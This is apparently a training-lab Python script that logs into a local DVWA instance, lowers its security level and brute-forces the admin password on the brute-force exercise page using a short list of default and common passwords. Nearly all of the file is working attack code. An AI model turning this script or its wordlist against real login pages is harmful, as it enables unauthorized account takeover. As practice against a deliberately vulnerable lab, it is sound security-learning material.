#!/usr/bin/env python3
import requests
import sys

print("=" * 50)
print("DVWA BRUTEFORCE ATTACK")
print("=" * 50)

s = requests.Session()
s.verify = False

# 1. Login to DVWA
print("[*] Logging into DVWA...")
r = s.post("http://dvwa.local/login.php", data={
    'username': 'admin',
    'password': 'password',
    'Login': 'Login'
})

if "Login failed" in r.text:
    print("[!] Login failed")
    sys.exit(1)

# 2. Set security level to low
print("[*] Setting security to low...")
s.post("http://dvwa.local/security.php", data={
    'security': 'low',
    'seclev_submit': 'Submit'
})

# 3. Target URL and user
target_url = "http://dvwa.local/vulnerabilities/brute/"
username = "admin"

# Password list (DVWA default passwords)
passwords = [
    'password',      # Default for 'admin'
    'abc123',        # Default for 'gordonb'  
    'charley',       # Default for '1337'
    'letmein',       # Default for 'pablo'
    '123456',
    '12345678',
    'qwerty',
    'admin',
    'monkey'
]

print(f"[*] Attacking user: {username}")
print(f"[*] Testing {len(passwords)} passwords")
print("-" * 40)

# 4. Bruteforce attack
success = False
for i, pwd in enumerate(passwords, 1):
    # Build GET request URL
    url = f"{target_url}?username={username}&password={pwd}&Login=Login"
    
    print(f"[{i:2d}] Testing: {pwd}")
    
    r = s.get(url)
    
    # Check for success indicators
    if "Welcome" in r.text or "successfully" in r.text:
        print(f"\n" + "=" * 40)
        print("[+] SUCCESS! Password found!")
        print(f"[+] Username: {username}")
        print(f"[+] Password: {pwd}")
        print("=" * 40)
        success = True
        break

if not success:
    print("\n[-] Password not found in list")
    print("[*] Try manual test with:")
    print("    URL: http://dvwa.local/vulnerabilities/brute/")
    print("    Credentials: admin / password")

print("\n[*] Attack completed")
